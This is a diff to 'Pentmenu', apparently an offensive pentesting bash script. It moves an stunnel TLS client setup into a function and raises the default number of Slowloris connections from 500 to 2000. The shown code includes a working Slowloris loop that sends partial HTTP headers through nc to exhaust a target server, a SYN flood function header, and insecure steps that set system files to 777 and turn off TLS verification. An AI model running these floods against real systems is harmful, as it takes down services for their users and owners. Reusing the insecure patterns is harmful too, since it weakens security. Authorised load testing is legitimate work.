@@ -1,5 +1,40 @@
 #!/bin/bash
 PS3="Pentmenu>"
+## create stunnel client function
+stunnel_client() 
+{ echo "use SSL? [y]es or [n]o (default):"
+	read SSL
+	: ${SSL:=n}
+if [[ "$SSL" = "y" ]]
+	then echo "Using SSL/TLS"
+LHOST=127.0.0.1
+LPORT=9991
+grep -q $LPORT /etc/services
+if [[ $? = 1 ]]
+then
+echo "Adding pentmenu stunnel service to /etc/services" && sudo chmod 777 /etc/services && sudo echo "pentmenu-stunnel-client 9991/tcp #pentmenu stunnel client listener" >> /etc/services &&  sudo chmod 644 /etc/services
+fi
+if test -f "/bin/ss"; then 
+	LISTPORT=ss; 
+	else LISTPORT=netstat
+fi
+$LISTPORT -tln |grep -q $LPORT
+if [[ "$?" = "1" ]]
+then
+	echo "Creating stunnel client on $LHOST:$LPORT"	
+		sudo rm -f /etc/stunnel/pentmenu.conf;
+		sudo touch /etc/stunnel/pentmenu.conf && sudo chmod 777 /etc/stunnel/pentmenu.conf
+		sudo echo "[PENTMENU-CLIENT]" >> /etc/stunnel/pentmenu.conf
+		sudo echo "client=yes" >> /etc/stunnel/pentmenu.conf
+		sudo echo "accept=$LHOST:$LPORT" >> /etc/stunnel/pentmenu.conf
+		sudo echo "connect=$TARGET:$PORT" >> /etc/stunnel/pentmenu.conf
+		sudo echo "verify=0" >> /etc/stunnel/pentmenu.conf
+		sudo chmod 644 /etc/stunnel/pentmenu.conf
+		sudo stunnel /etc/stunnel/pentmenu.conf && sleep 1
+else echo "Looks like stunnel is already listening on port 9991, so not recreating"
+fi
+fi }
+
 ## create TCP SYN flood function
 synflood()
 {		echo "TCP SYN Flood uses hping3...checking for hping3..."
@@ -94,11 +129,11 @@ PORT=80 && echo "Invalid port chosen! Reverting to port 80"
 	else echo "Using Port $PORT"
 	fi
 
-echo "Enter number of connections to open (default 500):"
+echo "Enter number of connections to open (default 2000):"
 		read CONNS
-	: ${CONNS:=500}
+	: ${CONNS:=2000}
 	if ! [[ "$CONNS" =~ ^[0-9]+$ ]]; then
-CONNS=500 && echo "Invalid integer!  Using 500 connections"
+CONNS=500 && echo "Invalid integer!  Using 2000 connections"
 	fi
 
 echo "Choose interval between sending headers."
@@ -112,44 +147,14 @@ INTERVAL=$((RANDOM % 11 + 5))
 then
 INTERVAL=$((RANDOM % 11 + 5)) && echo "Invalid integer!  Using random value between 5 and 15 seconds"
 	fi
-
-echo "use SSL? [y]es or [n]o (default):"
-	read SSL
-	: ${SSL:=n}
+stunnel_client
 if [[ "$SSL" = "y" ]]
-	then echo "Using SSL/TLS"
-LHOST=127.0.0.1
-LPORT=9991
-grep -q $LPORT /etc/services
-if [[ $? = 1 ]]
-then
-echo "Adding pentmenu slowloris service to /etc/services" && sudo chmod 777 /etc/services && sudo echo "pentmenu-stunnel-client 9991/tcp #pentmenu stunnel client listener" >> /etc/services &&  sudo chmod 644 /etc/services
-fi
-if test -f "/bin/ss"; then 
-	LISTPORT=ss; 
-	else LISTPORT=netstat
-fi
-$LISTPORT -tln |grep -q $LPORT
-if [[ "$?" = "1" ]]
-then
-	echo "Creating stunnel on $LHOST:$LPORT"	
-		sudo rm -f /etc/stunnel/pentmenu.conf;
-		sudo touch /etc/stunnel/pentmenu.conf && sudo chmod 777 /etc/stunnel/pentmenu.conf
-		sudo echo "[PENTMENU-CLIENT]" >> /etc/stunnel/pentmenu.conf
-		sudo echo "client=yes" >> /etc/stunnel/pentmenu.conf
-		sudo echo "accept=$LHOST:$LPORT" >> /etc/stunnel/pentmenu.conf
-		sudo echo "connect=$TARGET:$PORT" >> /etc/stunnel/pentmenu.conf
-		sudo echo "verify=0" >> /etc/stunnel/pentmenu.conf
-		sudo chmod 644 /etc/stunnel/pentmenu.conf
-		sudo stunnel /etc/stunnel/pentmenu.conf && sleep 1
-else echo "Looks like stunnel is already listening on port 9991, so not recreating"
-fi
+then 
 echo "Launching Slowloris....Use 'Ctrl c' to exit prematurely" && sleep 1
 	i=1
 	while [ "$i" -le "$CONNS" ]; do
 echo "Slowloris attack ongoing...this is connection $i, interval is $INTERVAL seconds"; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $LHOST $LPORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
 echo "Opened $CONNS connections....returning to menu"
-
 else 
 echo "Launching Slowloris....Use 'Ctrl c' to exit prematurely" && sleep 1
 	i=1
